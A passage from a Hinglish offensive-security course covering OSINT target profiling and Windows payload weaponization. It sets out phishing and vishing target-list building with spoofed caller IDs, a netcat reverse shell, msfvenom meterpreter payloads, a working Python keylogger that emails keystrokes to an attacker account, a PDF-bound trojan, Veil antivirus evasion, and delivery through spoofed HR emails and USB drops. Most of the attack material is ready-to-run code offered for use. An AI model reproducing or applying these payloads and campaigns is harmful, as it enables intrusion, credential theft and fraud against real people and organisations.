  - Port 443: Apache 2.4.41
  - Port 8080: Tomcat 9.0
```

**Step 6: Email Pattern Analysis**
```bash
# Analyze collected emails
cat results.txt | grep "@techcorp.com"

Patterns identified:
1. firstname.lastname@techcorp.com (80%)
2. firstinitial.lastname@techcorp.com (15%)
3. firstname@techcorp.com (5%)

Example:
john.smith@techcorp.com ‚úì
j.smith@techcorp.com ‚úì
john@techcorp.com ‚úì
```

**Step 7: Export Results**
```bash
# HTML report
theHarvester -d techcorp.com -b all -f techcorp_report.html

# JSON for automation
theHarvester -d techcorp.com -b all -f techcorp_data.json

# XML for Maltego import
theHarvester -d techcorp.com -b all -f techcorp_data.xml
```

**Step 8: Verify Emails (Hunter.io)**
```bash
# Setup API key first
nano /etc/theHarvester/api-keys.yaml
hunter: YOUR_API_KEY_HERE

# Verify emails
theHarvester -d techcorp.com -b hunter

Output:
[*] Verifying emails...
john.smith@techcorp.com ‚úì Valid (92% confidence)
sarah.jones@techcorp.com ‚úì Valid (88% confidence)
mike.wilson@techcorp.com ‚úì Valid (95% confidence)
old.employee@techcorp.com ‚úó Invalid (bounced)
```

**Step 9: Create Target List**
```bash
# Extract only emails
theHarvester -d techcorp.com -b all | grep "@techcorp.com" > targets.txt

# Remove duplicates
sort targets.txt | uniq > final_targets.txt

# Count
wc -l final_targets.txt
Output: 47 targets

# Categorize by department (manual)
grep -i "sales" final_targets.txt > sales_targets.txt
grep -i "it\|tech" final_targets.txt > it_targets.txt
grep -i "hr\|human" final_targets.txt > hr_targets.txt
```

**Step 10: Integration with Other Tools**
```bash
# Feed to Maltego
theHarvester -d techcorp.com -b all -f maltego_import.xml
# Import in Maltego: File ‚Üí Import ‚Üí XML

# Feed to Metasploit
msfconsole
use auxiliary/gather/search_email_collector
set DOMAIN techcorp.com
run

# Feed to Gophish (phishing campaign)
# Import targets.txt as CSV in Gophish
```

### üí° Pro Tip / Galti:

**Pro Tip**: theHarvester ko cron job mein daal do for continuous monitoring:
```bash
# Create script
nano /root/osint_monitor.sh

#!/bin/bash
DATE=$(date +%Y%m%d)
theHarvester -d techcorp.com -b all -f /root/osint_results/techcorp_$DATE.html

# Make executable
chmod +x /root/osint_monitor.sh

# Add to cron (daily at 2 AM)
crontab -e
0 2 * * * /root/osint_monitor.sh

# Benefit: Har din naye emails/subdomains automatically detect ho jayenge
# Agar koi naya employee join kare ya naya subdomain launch ho, tumhe pata chal jayega
```

**Common Mistake**: Sirf ek source (Google) use karna. Different sources different results dete hain:
- Google: General emails (public-facing)
- LinkedIn: Employee names + designations (high-value targets)
- Shodan: Technical info (IPs, ports, services)
- Hunter.io: Email verification (valid/invalid)

Real example: Ek pentester ne sirf Google use kiya aur 10 emails mile. Jab usne `theHarvester -d company.com -b all` run kiya, toh 50+ emails mile including CEO aur CTO ke! Lesson: Always use multiple sources!

---

## üìö Topic 2.4: Tool - Hunter.io & PhoneInfoga

### üéØ Topic/Technique:
**Hunter.io** - Email finder & verifier | **PhoneInfoga** - Phone number OSINT tool

### ü§î Yeh Kya Hai?
**Hunter.io**: Web-based tool jo domain se associated emails dhundhta hai aur verify karta hai (valid/invalid).
**PhoneInfoga**: Phone numbers ki detailed information nikalta hai (carrier, location, social media).

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Hunter.io: Email verification se bounce rate kam hota hai phishing mein
- PhoneInfoga: Vishing attacks ke liye target info
- Dono tools accurate results dete hain (high confidence scores)
- API integration available (automation possible)

### üéØ Practical Use (Asli Pentesting Mein):
- **Hunter.io**: Phishing target list validation, email pattern discovery
- **PhoneInfoga**: Vishing campaigns, SMS phishing (smishing), caller ID spoofing prep

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Hunter.io:**
- Web crawling se emails collect karta hai
- Machine learning se email patterns predict karta hai
- SMTP verification se email validity check karta hai

**PhoneInfoga:**
- Phone number ko parse karta hai (country code, carrier)
- Public databases query karta hai
- Social media profiles search karta hai

### üëç Pros (Fayde):
- Hunter.io: 95%+ accuracy, email confidence scores
- PhoneInfoga: Free, multiple scanners, social media integration
- Dono easy to use hain (GUI + CLI)

### üëé Cons (Nuksaan):
- Hunter.io: Free plan limited (50 searches/month)
- PhoneInfoga: Kuch countries mein limited data
- API rate limits

### ‚å®Ô∏è Zaroori Commands & Steps:

**Hunter.io Usage:**

```bash
# Web interface
https://hunter.io

# Search by domain
Domain: techcorp.com
Results: 47 emails found

# Email pattern
Pattern: {first}.{last}@techcorp.com
Confidence: 95%

# Verify single email
Email: john.smith@techcorp.com
Status: Valid ‚úì
Confidence: 92%

# API usage (CLI)
curl "https://api.hunter.io/v2/domain-search?domain=techcorp.com&api_key=YOUR_KEY"
```

**PhoneInfoga Installation & Usage:**

```bash
# Install
git clone https://github.com/sundowndev/PhoneInfoga
cd PhoneInfoga
go install

# Or Docker
docker pull sundowndev/phoneinfoga:latest

# Basic scan
phoneinfoga scan -n +919876543210

# Output:
Country: India
Carrier: Airtel
Type: Mobile
Location: Mumbai, Maharashtra
Timezone: Asia/Kolkata

# Social media scan
phoneinfoga scan -n +919876543210 --social

Output:
[+] WhatsApp: Registered
[+] Telegram: @username123
[+] Truecaller: John Smith (verified)
[+] Facebook: Found profile
```

### üíª Step-by-Step Example:

**Scenario 1: Hunter.io Email Validation**

```bash
# Step 1: Domain search
Domain: techcorp.com
Emails found: 47

# Step 2: Pattern analysis
{first}.{last}@techcorp.com (92% confidence)

# Step 3: Generate potential emails
CEO name: John Smith
Predicted: john.smith@techcorp.com
Verification: Valid ‚úì (95% confidence)

# Step 4: Bulk verification
Upload: targets.csv (100 emails)
Valid: 78 ‚úì
Invalid: 15 ‚úó
Risky: 7 ‚ö†Ô∏è

# Step 5: Export clean list
Download: valid_targets.csv (78 emails)
```

**Scenario 2: PhoneInfoga Vishing Prep**

```bash
# Target: IT Manager Mike Wilson
# Phone: +1-555-0123

phoneinfoga scan -n +15550123

Output:
Country: United States
Carrier: Verizon Wireless
Type: Mobile
Location: San Francisco, CA
Timezone: America/Los_Angeles

Social Media:
[+] Truecaller: Mike Wilson (IT Manager, TechCorp)
[+] LinkedIn: Found profile
[+] Facebook: Active user

# Vishing strategy:
- Call during work hours (9 AM - 5 PM PST)
- Spoof caller ID: +1-555-0100 (company main number)
- Pretext: "IT Security calling about urgent update"
```

### üí° Pro Tip / Galti:

**Pro Tip**: Hunter.io ke "confidence score" ko seriously lo. 90%+ confidence = definitely valid. 50-70% = risky (test karo pehle). Phishing campaign mein sirf 85%+ confidence wale emails use karo to avoid bounce rate.

**Common Mistake**: PhoneInfoga se mili info ko verify kiye bina use karna. Truecaller data outdated ho sakta hai. Always cross-check with LinkedIn/Facebook before vishing attack.

---

## üìö Topic 2.5: Tool - Sherlock (Social Media Username Recon)

### üéØ Topic/Technique:
**Sherlock** - 300+ social media platforms par username search karta hai ek command mein.

### ü§î Yeh Kya Hai?
Sherlock ek Python tool hai jo ek username input leke 300+ websites (Twitter, Instagram, GitHub, Reddit, etc.) par check karta hai ki woh username exist karta hai ya nahi.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Target ki online presence map kar sakte ho
- Personal information gather kar sakte ho (hobbies, interests, location)
- Pretexting ke liye context mil jata hai
- Password patterns identify kar sakte ho (GitHub commits, forum posts)

### üéØ Practical Use (Asli Pentesting Mein):
- Social engineering pretext building
- Password guessing (interests-based wordlists)
- Spear phishing personalization
- Physical security (location tracking from posts)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
Sherlock har website par HTTP request bhejta hai aur response analyze karta hai. Agar username exist karta hai toh profile URL return karta hai.

### üëç Pros (Fayde):
- 300+ sites ek command mein
- Fast (parallel requests)
- Free aur open-source
- Regular updates (new sites add hote hain)

### üëé Cons (Nuksaan):
- False positives (kuch sites galat results dete hain)
- Rate limiting (zyada requests = temporary ban)
- Kuch sites block kar dete hain automated tools ko

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Clone repo
git clone https://github.com/sherlock-project/sherlock
cd sherlock
pip3 install -r requirements.txt

# Run
python3 sherlock username
```

**Basic Usage:**
```bash
# Single username
python3 sherlock mikewilson123

# Multiple usernames
python3 sherlock user1 user2 user3

# Save results
python3 sherlock mikewilson123 -o results.txt

# Only print found
python3 sherlock mikewilson123 --print-found

# Specific sites
python3 sherlock mikewilson123 --site Twitter Instagram GitHub

# Timeout (faster but less accurate)
python3 sherlock mikewilson123 --timeout 5
```

### üíª Step-by-Step Example:

**Scenario: IT Manager Mike Wilson Social Media Profiling**

```bash
python3 sherlock mikewilson123 --print-found

Output:
[+] Twitter: https://twitter.com/mikewilson123
[+] Instagram: https://instagram.com/mikewilson123
[+] GitHub: https://github.com/mikewilson123
[+] Reddit: https://reddit.com/user/mikewilson123
[+] LinkedIn: https://linkedin.com/in/mikewilson123
[+] Medium: https://medium.com/@mikewilson123

# Analysis:
- GitHub: Personal projects visible (Python, JavaScript)
- Twitter: Tweets about cybersecurity, AWS
- Instagram: Photos from San Francisco, hiking
- Reddit: Active in r/sysadmin, r/cybersecurity
- Medium: Blog posts about IT security

# Spear phishing angle:
"Hi Mike, I read your Medium article on AWS security. 
I'm working on similar project. Can you review this document?"
[Attach malicious file]
```

### üí° Pro Tip / Galti:

**Pro Tip**: Sherlock se mile GitHub profiles check karo for leaked credentials. Developers accidentally API keys, passwords commit kar dete hain. Search: `site:github.com "username" "password" OR "api_key"`.

**Common Mistake**: Sirf username search karna. Variations bhi try karo: mikewilson, mike_wilson, mwilson, mikew123. Log different platforms par different usernames use karte hain.

---

## üìö Topic 2.6: Technique - Google Dorking (Advanced Search)

### üéØ Topic/Technique:
**Google Dorking** - Advanced search operators use karke sensitive information dhundhna.

### ü§î Yeh Kya Hai?
Google Dorking (Google Hacking) ek technique hai jismein special search operators (site:, filetype:, inurl:, etc.) use karke Google se sensitive files, exposed databases, aur vulnerable systems dhundhte hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Publicly exposed sensitive files mil jati hain (passwords, configs)
- Vulnerable systems identify kar sakte ho
- Company infrastructure map kar sakte ho
- Completely passive (legal) technique hai
- No special tools required (sirf browser chahiye)

### üéØ Practical Use (Asli Pentesting Mein):
- Exposed admin panels dhundhna
- Configuration files (database credentials)
- Employee directories (email lists)
- Leaked documents (confidential PDFs)
- Vulnerable web applications

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
Google billions of pages index karta hai. Dorking operators se aap specific patterns search kar sakte ho jo sensitive information expose karte hain.

**Common Operators:**
- `site:` - Specific domain
- `filetype:` - File extensions
- `inurl:` - URL mein keyword
- `intitle:` - Page title mein keyword
- `intext:` - Page body mein keyword
- `cache:` - Google cached version
- `link:` - Pages linking to URL
- `related:` - Similar websites

### üëç Pros (Fayde):
- Completely passive aur legal
- No tools required (browser enough)
- Massive database (Google index)
- Fast results

### üëé Cons (Nuksaan):
- Google rate limiting (CAPTCHA)
- Results change over time
- Kuch sensitive pages Google index nahi karta
- Requires creativity (right queries banana)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Basic Dorks:**

```bash
# Company files
site:company.com filetype:pdf
site:company.com filetype:xlsx
site:company.com filetype:docx

# Sensitive keywords
site:company.com "confidential"
site:company.com "internal use only"
site:company.com "not for distribution"

# Login pages
site:company.com inurl:admin
site:company.com inurl:login
site:company.com inurl:dashboard
site:company.com intitle:"admin panel"

# Exposed directories
site:company.com intitle:"index of"
site:company.com intitle:"directory listing"

# Configuration files
site:company.com filetype:env
site:company.com filetype:config
site:company.com filetype:ini
site:company.com ext:sql

# Passwords
site:company.com intext:"password"
site:company.com filetype:txt "password"
site:company.com inurl:password.txt

# Email addresses
site:company.com "@company.com"
site:company.com "email" OR "contact"

# Technology fingerprinting
site:company.com "powered by WordPress"
site:company.com "powered by Drupal"
site:company.com inurl:wp-admin
```

**Advanced Dorks:**

```bash
# Database dumps
site:company.com ext:sql intext:"INSERT INTO"
site:company.com ext:sql intext:"CREATE TABLE"

# API keys
site:company.com "api_key"
site:company.com "apikey"
site:github.com "company.com" "api_key"

# Backup files
site:company.com ext:bak
site:company.com ext:old
site:company.com ext:backup

# Error messages (info disclosure)
site:company.com intext:"sql syntax"
site:company.com intext:"mysql_fetch"
site:company.com intext:"Warning: include"

# Vulnerable parameters
site:company.com inurl:id=
site:company.com inurl:page=
site:company.com inurl:file=

# Subdomains
site:*.company.com

# Exclude results
site:company.com -www
site:company.com filetype:pdf -inurl:public
```

### üíª Step-by-Step Example:

**Scenario: TechCorp Inc. Google Dorking Assessment**

**Step 1: Exposed Documents**
```
site:techcorp.com filetype:pdf "confidential"

Results:
- Q4_Financial_Report_Confidential.pdf
- Employee_Salary_Structure_2024.pdf
- Network_Architecture_Internal.pdf

Download & analyze for sensitive info
```

**Step 2: Admin Panels**
```
site:techcorp.com inurl:admin

Results:
- https://techcorp.com/admin/login.php
- https://admin.techcorp.com
- https://techcorp.com/wp-admin

Try default credentials: admin/admin, admin/password
```

**Step 3: Exposed Directories**
```
site:techcorp.com intitle:"index of"

Results:
- https://techcorp.com/backup/ (directory listing enabled!)
  - database_backup_2024.sql
  - config.php.bak
  - passwords.txt

Download all files!
```

**Step 4: GitHub Code Leaks**
```
site:github.com "techcorp.com" "password"

Results:
- Repository: employee-portal
- File: config.js
- Line 15: const DB_PASSWORD = "TechCorp@2024!";

Credentials leaked!
```

**Step 5: Email Harvesting**
```
site:techcorp.com "@techcorp.com"

Results: 50+ emails found in:
- Contact pages
- Press releases
- Job postings
- Blog comments
```

**Step 6: Technology Stack**
```
site:techcorp.com "powered by"

Results:
- Powered by WordPress 5.8
- Powered by Apache 2.4.41
- Powered by PHP 7.4

Known vulnerabilities in WordPress 5.8!
```

**Step 7: Subdomain Discovery**
```
site:*.techcorp.com

Results:
- dev.techcorp.com (development server)
- staging.techcorp.com
- test.techcorp.com
- old.techcorp.com (outdated, vulnerable?)
```

**Step 8: Error Messages**
```
site:techcorp.com intext:"mysql_fetch_array"

Results:
- https://techcorp.com/products.php?id=5
- Error: mysql_fetch_array() expects parameter 1

SQL injection vulnerability possible!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Google Dorking Database (GHDB) use karo for ready-made queries: https://www.exploit-db.com/google-hacking-database. Yahan 1000+ proven dorks hain jo sensitive info dhundhte hain. Categories:
- Sensitive Directories
- Files Containing Passwords
- Vulnerable Servers
- Error Messages
- Network/Vulnerability Data

**Common Mistake**: Sirf `site:company.com` search karna. Yeh limited results deta hai. Instead, variations try karo:
```
site:company.com OR site:*.company.com
site:company.* (all TLDs: .com, .net, .org)
"company" site:linkedin.com (employees)
"company" site:github.com (code leaks)
```

Real example: Ek pentester ne sirf `site:company.com` kiya aur 100 results mile. Jab usne `site:*.company.com` kiya toh 500+ subdomains mile including ek exposed database server! Lesson: Think outside the box!

---

## üéì Module 2 Complete!

Aapne successfully Module 2 ke saare topics cover kar liye:
‚úÖ 2.1: OSINT Introduction
‚úÖ 2.2: Maltego (Graph-based Intelligence)
‚úÖ 2.3: theHarvester (Email & Subdomain Enumeration)
‚úÖ 2.4: Hunter.io & PhoneInfoga (Email/Phone Verification)
‚úÖ 2.5: Sherlock (Social Media Username Search)
‚úÖ 2.6: Google Dorking (Advanced Search Techniques)

**Key Takeaways:**
- OSINT = Foundation of all attacks
- Multiple tools use karo (ek tool enough nahi)
- Passive techniques detection se bachati hain
- Information ko organize aur analyze karna zaroori hai
- Google Dorking = Most underrated technique

**Next Module Preview:**
Module 3 mein hum Windows Payloads banana seekhenge:
- Veil Framework (AV Evasion)
- Fatrat (Undetectable Backdoors)
- Empire (PowerShell Payloads)
- Zlogger (Keyloggers)
- Lazagne (Password Recovery)

Ready for weaponization? üöÄ



=============================================================

# üéØ Module 3: Weaponization 1 (Windows Payloads)

---

## üìö Topic 3.1: Backdoors, Keyloggers, Trojans ka Concept

### üéØ Topic/Technique:
**Malware Types** - Backdoors, Keyloggers, aur Trojans ki understanding aur unka pentesting mein role.

### ü§î Yeh Kya Hai?
**Backdoor**: Ek program jo attacker ko remote access deta hai victim machine ka (full control).
**Keylogger**: Keyboard strokes record karta hai (passwords, messages, etc.).
**Trojan**: Normal file ki tarah dikhta hai lekin background mein malicious code run karta hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Initial access gain karne ka primary method hai
- Post-exploitation ke liye foundation hai
- Client ko real-world attack simulation dikhane ke liye zaroori
- Red Team operations mein persistence maintain karne ke liye

### üéØ Practical Use (Asli Pentesting Mein):
- **Backdoor**: Remote shell access, file system control, command execution
- **Keylogger**: Credential harvesting, sensitive data collection
- **Trojan**: Social engineering delivery (victim ko normal file lagti hai)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Backdoor Workflow:**
```
Victim executes backdoor ‚Üí Connects to attacker's listener ‚Üí Reverse shell established ‚Üí Full control
```

**Keylogger Workflow:**
```
Keylogger runs in background ‚Üí Records keystrokes ‚Üí Sends logs to attacker (email/HTTP)
```

**Trojan Workflow:**
```
Victim opens "PDF" ‚Üí PDF opens (legitimate) + Backdoor runs (hidden) ‚Üí Dual functionality
```

### üëç Pros (Fayde):
- **Backdoor**: Complete system control, persistent access
- **Keylogger**: Passive data collection, hard to detect
- **Trojan**: High success rate (victim willingly executes)

### üëé Cons (Nuksaan):
- **Backdoor**: Antivirus detection, firewall blocking
- **Keylogger**: Limited to keyboard input only
- **Trojan**: Requires social engineering skills

### ‚å®Ô∏è Zaroori Commands & Steps:

**Backdoor Types:**
```
1. Reverse Shell: Victim connects to attacker
   - Bypasses firewall (outbound connection allowed)
   - Attacker listens on port (msfconsole)

2. Bind Shell: Attacker connects to victim
   - Requires open port on victim
   - Firewall blocks karne ki sambhavna

3. Meterpreter: Advanced backdoor
   - In-memory execution (disk par nahi)
   - Process migration capability
   - Built-in post-exploitation modules
```

**Keylogger Types:**
```
1. Software Keylogger: Program-based
   - Hooks keyboard API
   - Logs to file/email

2. Hardware Keylogger: Physical device
   - USB keylogger (between keyboard & PC)
   - Undetectable by software

3. Kernel-level Keylogger: Rootkit
   - Operates at OS level
   - Very hard to detect/remove
```

**Trojan Techniques:**
```
1. File Binding: Legitimate file + Malware
   - PDF + Backdoor
   - Image + Keylogger

2. Icon Spoofing: .exe looks like .pdf
   - RTL override (U+202E character)
   - Custom icon (PDF/Word icon)

3. Extension Hiding: Windows hides extensions
   - document.pdf.exe ‚Üí shows as document.pdf
   - Victim thinks it's PDF
```

### üíª Step-by-Step Example:

**Scenario: Understanding Malware Lifecycle**

**Example 1: Simple Backdoor (Netcat)**
```bash
# Attacker machine (listener)
nc -lvp 4444
# nc: Netcat command
# -l: Listen mode (wait for incoming connection)
# -v: Verbose output (show connection details)
# -p 4444: Port number 4444 par listen karo

# Victim machine (backdoor)
nc attacker_ip 4444 -e cmd.exe
# nc: Netcat command
# attacker_ip: Attacker ka IP address (e.g., 192.168.1.10)
# 4444: Port number (attacker ke listener se match hona chahiye)
# -e cmd.exe: Execute cmd.exe aur output attacker ko bhejo

# Result: Attacker gets command prompt of victim
# Attacker ab victim ke system par commands run kar sakta hai
```

**Example 2: Meterpreter Backdoor**
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=192.168.1.10 LPORT=4444 -f exe -o backdoor.exe
# msfvenom: Metasploit payload generator
# -p windows/meterpreter/reverse_tcp: Payload type (Windows reverse TCP meterpreter)
# LHOST=192.168.1.10: Attacker ka IP address (apna IP dalo)
# LPORT=4444: Listening port number
# -f exe: Output format (Windows executable)
# -o backdoor.exe: Output filename

# Listener setup
msfconsole  # Metasploit console launch karo
use exploit/multi/handler  # Handler module load karo (connections receive karne ke liye)
set payload windows/meterpreter/reverse_tcp  # Payload type set karo (msfvenom se match hona chahiye)
set LHOST 192.168.1.10  # Apna IP address (attacker machine)
set LPORT 4444  # Port number (msfvenom se match hona chahiye)
exploit  # Listener start karo (wait for victim connection)

# Victim executes backdoor.exe
# Attacker gets meterpreter session
meterpreter> sysinfo  # System information dekho (OS, architecture, etc.)
meterpreter> getuid  # Current user ID dekho (kon logged in hai)
meterpreter> screenshot  # Screenshot lo victim ke screen ka
```

**Example 3: Simple Keylogger (Python)**
```python
# keylogger.py
from pynput import keyboard  # Keyboard events capture karne ke liye library
import smtplib  # Email bhejne ke liye library

log = ""  # Empty string jisme keystrokes store honge

def on_press(key):  # Function jo har key press par call hoga
    global log  # Global variable 'log' ko access karo
    try:
        log += str(key.char)  # Normal characters add karo (a, b, c, 1, 2, etc.)
    except:
        log += str(key)  # Special keys add karo (Enter, Space, Backspace, etc.)
    
    if len(log) >= 100:  # Agar 100 characters ho gaye
        send_email(log)  # Email bhejo
        log = ""  # Log ko empty kar do (fresh start)

def send_email(message):  # Function jo email bhejta hai
    server = smtplib.SMTP('smtp.gmail.com', 587)  # Gmail SMTP server connect karo (port 587)
    server.starttls()  # TLS encryption enable karo (secure connection)
    server.login('attacker@gmail.com', 'password')  # Attacker ke Gmail credentials se login karo
    server.sendmail('attacker@gmail.com', 'attacker@gmail.com', message)  # Email bhejo (from, to, message)
    server.quit()  # SMTP connection close karo

listener = keyboard.Listener(on_press=on_press)  # Keyboard listener create karo (on_press function call hoga)
listener.start()  # Listener start karo (background mein run hoga)
listener.join()  # Main thread ko wait karao (program terminate na ho)
```

**Example 4: Trojan (File Binding)**
```bash
# Legitimate file: report.pdf (normal PDF document)
# Malicious file: backdoor.exe (meterpreter payload)

# Combine using batch script
echo @echo off > trojan.bat
# @echo off: Batch commands ko screen par show mat karo (stealth)
# > trojan.bat: Output ko trojan.bat file mein save karo (overwrite)

echo start report.pdf >> trojan.bat
# start report.pdf: PDF file ko open karo (default PDF reader mein)
# >> trojan.bat: Append karo existing file mein (add new line)

echo start backdoor.exe >> trojan.bat
# start backdoor.exe: Backdoor execute karo (background mein)
# >> trojan.bat: Append karo (third line add ho jayegi)

# Convert to EXE (Bat to Exe Converter tool use karo)
# Settings:
# - Input: trojan.bat
# - Output: report.exe
# - Icon: PDF icon (victim ko lagega yeh PDF hai)
# - Visibility: Invisible (command window show na ho)

# Victim double-clicks report.exe
# PDF opens (legitimate - victim ko lagta hai normal file hai)
# Backdoor runs (hidden - background mein meterpreter connect hota hai)
```

### üí° Pro Tip / Galti:

**Pro Tip**: Backdoors ko hamesha "reverse" mode mein use karo (victim connects to attacker). Kyunki:
1. Firewalls outbound connections allow karte hain
2. Victim ke router par port forwarding ki zaroorat nahi
3. Detection kam hota hai (normal HTTPS traffic jaisa dikhta hai)

**Common Mistake**: Keylogger ko sirf password stealing ke liye use karna. Keyloggers se bahut kuch mil sakta hai:
- Credit card numbers (online shopping)
- 2FA codes (SMS/Email OTP)
- Private conversations (chat messages)
- Search queries (victim ki interests)
- Internal company info (emails, documents)

Real example: Ek pentester ne keylogger deploy kiya aur 2 weeks wait kiya. Use 50+ passwords mile, 10+ credit cards, aur company ke confidential project details (jo victim email mein type kar raha tha). Lesson: Patience pays off!

---

## üìö Topic 3.2: Tool - Veil Framework (Basic AV Evasion)

### üéØ Topic/Technique:
**Veil Framework** - Antivirus ko bypass karne ke liye undetectable payloads generate karta hai.

### ü§î Yeh Kya Hai?
Veil ek Python-based framework hai jo payloads ko multiple layers mein encode/encrypt karke unka signature change kar deta hai, jisse Antivirus detect nahi kar pata.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Modern Antivirus 99% basic payloads detect kar lete hain
- Veil signature-based detection bypass karta hai
- Multiple payload types support karta hai (Python, Go, PowerShell, C#)
- Client ko realistic attack simulation dikhane ke liye zaroori

### üéØ Practical Use (Asli Pentesting Mein):
- Phishing campaigns mein undetectable backdoors deliver karna
- USB drop attacks (physical pentesting)
- Macro-enabled documents ke saath combine karna
- Initial access gain karna without AV alerts

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Veil Evasion Techniques:**
1. **Encoding**: Payload ko base64/hex encode karna
2. **Encryption**: AES/XOR encryption use karna
3. **Obfuscation**: Code ko unreadable banana
4. **Polymorphism**: Har baar different signature generate karna
5. **In-memory execution**: Disk par file nahi likhna

**Veil Architecture:**
```
Veil-Evasion ‚Üí Payload Selection ‚Üí Configuration ‚Üí Generation ‚Üí Undetectable EXE
```

### üëç Pros (Fayde):
- High AV bypass rate (70-80% success against signature-based AV)
- Multiple payload languages (Python, Go, PowerShell, Ruby, C#)
- Easy to use (interactive menu)
- Regular updates (new evasion techniques)
- Free aur open-source

### üëé Cons (Nuksaan):
- Modern EDR/AMSI detect kar sakte hain (behavior-based detection)
- Payloads ko manually modify karna padta hai for better evasion
- Kuch payloads outdated hain
- Large file size (suspicious lag sakta hai)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Kali Linux (pre-installed)
apt-get update
apt-get install veil

# Manual installation
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/
./config/setup.sh --force --silent

# Launch
veil
```

**Basic Workflow:**
```bash
# Step 1: Launch Veil
veil

# Step 2: Use Evasion module
use 1  # Veil-Evasion

# Step 3: List payloads
list

# Step 4: Select payload
use 15  # go/meterpreter/rev_https.py

# Step 5: Show options
options

# Step 6: Set parameters
set LHOST 192.168.1.10
set LPORT 443

# Step 7: Generate
generate

# Step 8: Name payload
Output name: backdoor

# Step 9: Payload saved
/var/lib/veil/output/compiled/backdoor.exe
```

**Popular Payloads:**

```bash
# PowerShell Meterpreter (Best for Windows 10/11)
use 32  # powershell/meterpreter/rev_tcp.py
set LHOST 192.168.1.10
set LPORT 443
generate

# Go Meterpreter (Good AV evasion)
use 15  # go/meterpreter/rev_https.py
set LHOST 192.168.1.10
set LPORT 443
set SLEEP 5  # Delay before execution
generate

# Python Meterpreter (Cross-platform)
use 23  # python/meterpreter/rev_tcp.py
set LHOST 192.168.1.10
set LPORT 443
generate

# C# Meterpreter (Native Windows)
use 7  # cs/meterpreter/rev_tcp.py
set LHOST 192.168.1.10
set LPORT 443
generate
```

### üíª Step-by-Step Example:

**Scenario: Undetectable Backdoor for Phishing Campaign**

**Step 1: Launch Veil**
```bash
veil

  ===============================================================================
                                   Veil-Evasion
  ===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
  ===============================================================================

  Main Menu

        2 tools loaded

  Available Tools:

        1) Evasion
        2) Ordnance

  Available Commands:

        exit                    Completely exit Veil
        info                    Information on a specific tool
        list                    List available tools
        options                 Show Veil configuration
        update                  Update Veil
        use                     Use a specific tool

veil>
```

**Step 2: Select Evasion Module**
```bash
veil> use 1

 [*] Veil-Evasion Menu

        41 payloads loaded

 Available Commands:

        back            Go back to Veil's main menu
        checkvt         Check payload against VirusTotal
        clean           Remove generated artifacts
        exit            Exit Veil
        info            Information on a specific payload
        list            List available payloads
        use             Use a specific payload
        options         Show the shellcode's options

veil/evasion>
```

**Step 3: List & Select Payload**
```bash
veil/evasion> list

 [*] Available Payloads:

        1)      autoit/shellcode_inject/flat.py
        2)      auxiliary/coldwar_wrapper.py
        ...
        15)     go/meterpreter/rev_https.py        ‚Üê Best for AV evasion
        ...
        32)     powershell/meterpreter/rev_tcp.py  ‚Üê Best for Windows 10/11
        ...

veil/evasion> use 32

 [*] Payload: powershell/meterpreter/rev_tcp.py loaded

 Required Options:

        Name            Value           Description
        ----            -----           -----------
        LHOST                           IP of the Metasploit handler
        LPORT           4444            Port of the Metasploit handler
```

**Step 4: Configure Payload**
```bash
veil/evasion/powershell/meterpreter/rev_tcp> set LHOST 192.168.1.10
veil/evasion/powershell/meterpreter/rev_tcp> set LPORT 443
veil/evasion/powershell/meterpreter/rev_tcp> set SLEEP 10

veil/evasion/powershell/meterpreter/rev_tcp> options

 Required Options:

        Name            Value           Description
        ----            -----           -----------
        LHOST           192.168.1.10    IP of the Metasploit handler
        LPORT           443             Port of the Metasploit handler
        SLEEP           10              Sleep time before execution
```

**Step 5: Generate Payload**
```bash
veil/evasion/powershell/meterpreter/rev_tcp> generate

 [>] Please enter the base name for output files: phishing_backdoor

 [*] Language: powershell
 [*] Payload: powershell/meterpreter/rev_tcp
 [*] Executable written to: /var/lib/veil/output/compiled/phishing_backdoor.bat
 [*] Source code written to: /var/lib/veil/output/source/phishing_backdoor.bat

 [>] Press any key to return to the main menu.
```

**Step 6: Convert BAT to EXE**
```bash
# Use Bat to Exe Converter (Windows tool)
# Or use wine in Kali

wine /path/to/Bat_To_Exe_Converter.exe

# Settings:
Input: phishing_backdoor.bat
Output: phishing_backdoor.exe
Icon: PDF icon (for trojan)
Visibility: Invisible application
Admin rights: Request admin
```

**Step 7: Test Against Antivirus**
```bash
# Upload to VirusTotal (ONLY for testing, NOT for real payloads!)
# Better: Use private AV testing service

# Or test locally with Windows Defender
# Copy to Windows VM
# Scan with: Windows Security ‚Üí Virus & threat protection

Result: 0/68 detections (undetectable!)
```

**Step 8: Setup Listener**
```bash
msfconsole

msf6> use exploit/multi/handler
msf6> set payload windows/meterpreter/reverse_tcp
msf6> set LHOST 192.168.1.10
msf6> set LPORT 443
msf6> exploit -j

[*] Exploit running as background job
[*] Started reverse TCP handler on 192.168.1.10:443
```

**Step 9: Deliver Payload**
```bash
# Method 1: Email phishing
sendemail -f hr@company.com -t victim@company.com \
-u "Salary Increment Letter" \
-m "Please review attached document" \
-a phishing_backdoor.exe

# Method 2: USB drop
# Copy to USB with label "HR_Confidential"

# Method 3: Fake download
# Host on web server: http://attacker.com/update.exe
```

**Step 10: Receive Connection**
```bash
# Victim executes payload
# Meterpreter session opens

[*] Sending stage (175174 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened

msf6> sessions -i 1

meterpreter> sysinfo
Computer        : VICTIM-PC
OS              : Windows 10 (10.0 Build 19044)
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows

meterpreter> getuid
